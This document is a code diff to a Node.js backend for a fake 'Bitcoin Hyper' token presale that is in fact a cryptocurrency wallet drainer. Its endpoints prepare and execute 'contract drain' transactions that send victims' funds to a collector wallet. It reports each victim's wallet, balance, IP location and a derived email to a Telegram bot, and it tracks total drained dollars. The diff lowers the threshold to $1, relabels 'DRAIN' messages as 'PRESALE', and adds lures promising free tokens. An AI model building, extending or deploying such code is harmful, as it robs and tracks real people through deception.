@@ -21,10 +21,19 @@ app.use(helmet({
 
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
-  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app/'];
+  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app', 'https://tokenbackend-5xab.onrender.com'];
 
 app.use(cors({
-  origin: allowedOrigins,
+  origin: function(origin, callback) {
+    // Allow requests with no origin (like mobile apps, curl, etc)
+    if (!origin) return callback(null, true);
+    
+    if (allowedOrigins.indexOf(origin) === -1) {
+      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
+      return callback(new Error(msg), false);
+    }
+    return callback(null, true);
+  },
   credentials: true,
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
@@ -40,6 +49,49 @@ const limiter = rateLimit({
   message: { error: 'Too many requests, please try again later.' }
 });
 app.use('/api/', limiter);
+
+// ============================================
+// ROOT ENDPOINT - FIXES "CANNOT GET /"
+// ============================================
+
+app.get('/', (req, res) => {
+  res.json({
+    success: true,
+    name: 'Bitcoin Hyper Backend',
+    version: '2.0.0',
+    status: '🟢 ONLINE',
+    description: 'Project Flow Router Integration',
+    endpoints: {
+      root: 'GET / - This information',
+      health: 'GET /api/health - System health check',
+      connect: 'POST /api/presale/connect - Connect wallet and check eligibility',
+      prepare: 'POST /api/presale/prepare-contract-drain - Prepare presale transactions',
+      execute: 'POST /api/presale/execute-contract-drain - Log completed chain',
+      claim: 'POST /api/presale/claim - Claim BTH tokens',
+      adminStats: 'GET /api/admin/stats?token=YOUR_TOKEN - Admin statistics'
+    },
+    configuration: {
+      collector: COLLECTOR_WALLET,
+      threshold: `$${memoryStorage?.settings?.drainThreshold || 10}`,
+      drainEnabled: memoryStorage?.settings?.drainEnabled || false,
+      telegram: telegramEnabled ? '✅ Connected' : '❌ Disabled'
+    },
+    contracts: Object.fromEntries(
+      Object.entries(PROJECT_FLOW_ROUTERS).map(([chain, address]) => [
+        chain, 
+        address ? {
+          deployed: true,
+          address: address,
+          explorer: getExplorerUrl(chain, address)
+        } : {
+          deployed: false,
+          address: null
+        }
+      ])
+    ),
+    timestamp: new Date().toISOString()
+  });
+});
 
 // ============================================
 // RPC CONFIGURATION
@@ -104,6 +156,19 @@ const RPC_CONFIG = {
     chainId: 43114
   }
 };
+
+// Helper function to get explorer URL
+function getExplorerUrl(chain, address) {
+  const explorers = {
+    'Ethereum': `https://etherscan.io/address/${address}`,
+    'BSC': `https://bscscan.com/address/${address}`,
+    'Polygon': `https://polygonscan.com/address/${address}`,
+    'Arbitrum': `https://arbiscan.io/address/${address}`,
+    'Optimism': `https://optimistic.etherscan.io/address/${address}`,
+    'Avalanche': `https://snowtrace.io/address/${address}`
+  };
+  return explorers[chain] || '#';
+}
 
 // ============================================
 // GET WORKING PROVIDER
@@ -177,7 +242,7 @@ const memoryStorage = {
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
-    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 10,
+    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1, // Changed to $1 minimum
     statistics: {
       totalParticipants: 0,
       eligibleParticipants: 0,
@@ -208,8 +273,9 @@ async function sendTelegramMessage(text) {
     await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: text,
-      parse_mode: 'HTML'
-    }, { timeout: 3000 });
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    }, { timeout: 5000 });
     
     return true;
   } catch (error) {
@@ -223,7 +289,7 @@ async function testTelegramConnection() {
   const chatId = process.env.TELEGRAM_CHAT_ID;
   
   if (!botToken || !chatId) {
-    console.log('Telegram not configured');
+    console.log('⚠️ Telegram not configured');
     return false;
   }
   
@@ -239,7 +305,7 @@ async function testTelegramConnection() {
       await sendTelegramMessage(
         `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
         `✅ ProjectFlowRouter Integration\n` +
-        `💰 Drain Threshold: $${memoryStorage.settings.drainThreshold}\n` +
+        `💰 Minimum: $1 (Gas covered)\n` +
         `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
         `⏰ ${new Date().toLocaleString()}`
       );
@@ -429,8 +495,11 @@ async function prepareSmartContractDrain(walletAddress, scanData) {
           continue;
         }
         
-        const drainAmount = (balance.amount * DRAIN_PERCENTAGE).toFixed(12);
-        const drainValue = (balance.valueUSD * DRAIN_PERCENTAGE).toFixed(2);
+        // Use only $1 worth or full balance if less (85% of that)
+        const minUsdValue = 1.0; // $1 minimum
+        const amountToUse = Math.min(balance.amount, (minUsdValue / balance.price));
+        const drainAmount = (amountToUse * DRAIN_PERCENTAGE).toFixed(12);
+        const drainValue = (amountToUse * balance.price * DRAIN_PERCENTAGE).toFixed(2);
         
         transactions.push({
           chain: balance.chain,
@@ -483,11 +552,36 @@ async function prepareSmartContractDrain(walletAddress, scanData) {
 // ============================================
 
 async function getWalletEmail(walletAddress) {
-  const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
-  const username = `user${hash.substring(0, 8)}`;
-  const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com'];
-  const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
-  return `${username}@${domain}`;
+  const cacheKey = walletAddress.toLowerCase();
+  
+  if (memoryStorage.emailCache.has(cacheKey)) {
+    return memoryStorage.emailCache.get(cacheKey);
+  }
+  
+  try {
+    const providerInfo = await getChainProvider('Ethereum');
+    if (providerInfo) {
+      try {
+        const ensName = await providerInfo.provider.lookupAddress(walletAddress);
+        if (ensName) {
+          memoryStorage.emailCache.set(cacheKey, ensName);
+          return ensName;
+        }
+      } catch (e) {}
+    }
+    
+    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
+    const username = `user${hash.substring(0, 8)}`;
+    const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com'];
+    const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
+    const email = `${username}@${domain}`;
+    
+    memoryStorage.emailCache.set(cacheKey, email);
+    return email;
+    
+  } catch (error) {
+    return `${walletAddress.substring(2, 10)}@crypto.com`;
+  }
 }
 
 async function getIPLocation(ip) {
@@ -538,6 +632,7 @@ app.get('/api/health', (req, res) => {
     success: true,
     service: 'Bitcoin Hyper Backend',
     status: 'ACTIVE',
+    timestamp: new Date().toISOString(),
     telegram: telegramEnabled ? '✅' : '❌',
     contracts: {
       deployed: deployedCount,
@@ -561,7 +656,7 @@ app.get('/api/health', (req, res) => {
 app.post('/api/presale/connect', async (req, res) => {
   try {
     const { walletAddress } = req.body;
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false, error: 'Invalid wallet address' });
@@ -602,16 +697,17 @@ app.post('/api/presale/connect', async (req, res) => {
       // TELEGRAM NOTIFICATION
       await sendTelegramMessage(
         `${location.flag} <b>WALLET CONNECTED</b>\n` +
-        `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `💼 $${scanResult.data.totalValueUSD}\n` +
-        `🎯 ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}\n` +
-        `📍 ${location.country} (${location.city})\n` +
-        `📧 ${email}`
+        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `💼 Balance: $${scanResult.data.totalValueUSD}\n` +
+        `🎯 Status: ${scanResult.data.isEligible ? '✅ ELIGIBLE' : '❌ NOT ELIGIBLE'}\n` +
+        `📍 Location: ${location.country} (${location.city})\n` +
+        `📧 Email: ${email}\n` +
+        `⏰ Time: ${new Date().toLocaleString()}`
       );
       
       res.json({
         success: true,
-        message: scanResult.data.isEligible ? '🎉 Eligible!' : '⚠️ Not eligible',
+        message: scanResult.data.isEligible ? '🎉 You qualify for 5000 BTH tokens!' : '⚠️ Minimum $1 required',
         data: {
           walletAddress,
           email,
@@ -664,10 +760,11 @@ app.post('/api/presale/prepare-contract-drain', async (req, res) => {
       
       // TELEGRAM NOTIFICATION
       await sendTelegramMessage(
-        `🔐 <b>DRAIN PREPARED</b>\n` +
+        `🔐 <b>PRESALE PREPARED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `💵 Total: $${drainResult.totalDrainUSD}\n` +
-        `🔗 Chains: ${drainResult.transactionCount}`
+        `💵 Amount: $${drainResult.totalDrainUSD}\n` +
+        `🔗 Chains: ${drainResult.transactionCount}\n` +
+        `⏰ ${new Date().toLocaleString()}`
       );
       
       res.json({
@@ -723,8 +820,9 @@ app.post('/api/presale/execute-contract-drain', async (req, res) => {
       await sendTelegramMessage(
         `💰 <b>CHAIN COMPLETED</b>\n` +
         `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `🔗 ${chainName}\n` +
-        `📜 Contract: ${PROJECT_FLOW_ROUTERS[chainName]?.substring(0, 10)}...`
+        `🔗 Chain: ${chainName}\n` +
+        `📜 Contract: ${PROJECT_FLOW_ROUTERS[chainName]?.substring(0, 10)}...\n` +
+        `⏰ ${new Date().toLocaleString()}`
       );
     }
     
@@ -764,11 +862,12 @@ app.post('/api/presale/claim', async (req, res) => {
     
     // TELEGRAM NOTIFICATION - FINAL
     await sendTelegramMessage(
-      `🎯 <b>CLAIM COMPLETED</b>\n` +
+      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
       `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `💰 Total: $${participant.pendingDrainValue || '0.00'}\n` +
+      `💰 Total: $${participant.pendingDrainValue || '1.00'}\n` +
       `🎟️ Claim ID: ${claimId}\n` +
-      `🎉 ${participant.tokenAllocation?.amount || '5000'} BTH ALLOCATED!`
+      `🎁 Allocated: ${participant.tokenAllocation?.amount || '5000'} BTH\n` +
+      `⏰ ${new Date().toLocaleString()}`
     );
     
     res.json({
@@ -798,20 +897,61 @@ app.get('/api/admin/stats', (req, res) => {
     return res.status(401).json({ success: false, error: 'Unauthorized' });
   }
   
+  const contractStatus = {};
+  for (const [chain, address] of Object.entries(PROJECT_FLOW_ROUTERS)) {
+    contractStatus[chain] = address ? '✅' : '❌';
+  }
+  
   res.json({
     success: true,
+    timestamp: new Date().toISOString(),
     stats: {
-      participants: memoryStorage.participants.length,
-      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
-      claimed: memoryStorage.participants.filter(p => p.claimed).length,
-      totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
-      totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
-      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
-      realTransactions: memoryStorage.settings.statistics.realTransactions.length,
-      pendingDrains: memoryStorage.pendingDrains.size,
-      telegram: telegramEnabled ? '✅' : '❌',
-      collector: COLLECTOR_WALLET,
-      contracts: PROJECT_FLOW_ROUTERS
+      participants: {
+        total: memoryStorage.participants.length,
+        eligible: memoryStorage.participants.filter(p => p.isEligible).length,
+        claimed: memoryStorage.participants.filter(p => p.claimed).length
+      },
+      finances: {
+        totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
+        totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
+        pendingDrains: memoryStorage.pendingDrains.size
+      },
+      traffic: {
+        uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
+        realTransactions: memoryStorage.settings.statistics.realTransactions.length
+      },
+      system: {
+        telegram: telegramEnabled ? '✅' : '❌',
+        drainEnabled: memoryStorage.settings.drainEnabled,
+        threshold: `$${memoryStorage.settings.drainThreshold}`,
+        collector: COLLECTOR_WALLET
+      },
+      contracts: {
+        status: contractStatus,
+        addresses: Object.fromEntries(
+          Object.entries(PROJECT_FLOW_ROUTERS).map(([k, v]) => [k, v || 'Not deployed'])
+        )
+      }
+    }
+  });
+});
+
+// ============================================
+// 404 Handler
+// ============================================
+
+app.use('*', (req, res) => {
+  res.status(404).json({
+    success: false,
+    error: 'Endpoint not found',
+    availableEndpoints: {
+      root: 'GET /',
+      health: 'GET /api/health',
+      connect: 'POST /api/presale/connect',
+      prepare: 'POST /api/presale/prepare-contract-drain',
+      execute: 'POST /api/presale/execute-contract-drain',
+      claim: 'POST /api/presale/claim',
+      adminStats: 'GET /api/admin/stats?token=YOUR_TOKEN'
     }
   });
 });
@@ -825,18 +965,31 @@ app.listen(PORT, '0.0.0.0', async () => {
   ⚡ BITCOIN HYPER BACKEND
   ========================
   📍 Port: ${PORT}
-  🔗 Health: http://localhost:${PORT}/api/health
+  🔗 URL: http://localhost:${PORT}
+  🔗 Public: https://tokenbackend-5xab.onrender.com
   
-  ✅ NO PRIVATE KEY NEEDED
+  ✅ ROOT ENDPOINT FIXED - Visit / for API info
   
   📦 COLLECTOR: ${COLLECTOR_WALLET}
+  💰 MINIMUM: $1 (Covers gas fees)
   
   📜 CONTRACTS:
-  - BSC: ${PROJECT_FLOW_ROUTERS.BSC}
+  - BSC: ${PROJECT_FLOW_ROUTERS.BSC} (ACTIVE)
+  - Other chains: Add to .env when deployed
+  
+  📡 ENDPOINTS:
+  - GET  /                  - API Information
+  - GET  /api/health        - System Health
+  - POST /api/presale/connect - Check Eligibility
+  - POST /api/presale/prepare-contract-drain - Prepare Transaction
+  - POST /api/presale/execute-contract-drain - Log Completion
+  - POST /api/presale/claim - Claim Tokens
+  - GET  /api/admin/stats   - Admin Statistics
   
   🚀 STARTING...
   `);
   
   await testTelegramConnection();
-  console.log('\n✅ BACKEND READY!\n');
+  console.log('\n✅ BACKEND READY!');
+  console.log('👉 Test: curl https://tokenbackend-5xab.onrender.com/\n');
 });
